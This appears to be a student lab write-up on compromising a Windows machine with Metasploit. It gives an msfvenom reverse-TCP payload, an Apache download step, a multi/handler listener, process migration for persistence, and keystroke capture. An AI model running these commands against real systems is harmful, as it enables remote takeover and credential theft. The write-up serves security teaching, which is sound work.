# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/6e11e35c-4c2c-4b7f-b903-58b1582a464b)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/dec59a23-57c8-45d3-8dd5-0a544aa51bac)
copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/80180526-7555-4508-a89c-53d41ade25f3)
Start apache server sudo systemctl apache2 start
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/d37aa8bf-5f56-4880-b314-22aa36443787)
Check the status of apache2
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/10180e97-3b84-48d5-9be2-b392e79b2b61)
Invoke msfconsole:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/64c0064a-0cd1-46bd-8381-5a6c8407e861)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. 
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/10b0f12b-e41d-46cb-a1c3-47abd997e0e1)
Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/e16657d8-97f0-4a64-9b98-546a435c48c2)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/5a5b5d17-af40-4da3-94e2-7b3ab0cfa3a6)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/a67b30ad-fd96-400f-9c73-37a5700ba5eb)
keyscan_dump Shows the keystrokes captured so far 
![image](https://github.com/vithyasenthilkumar/Compromising-windows-using-Metasploit/assets/127177445/f98298f8-2a9e-40be-a395-6222ac594da5)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
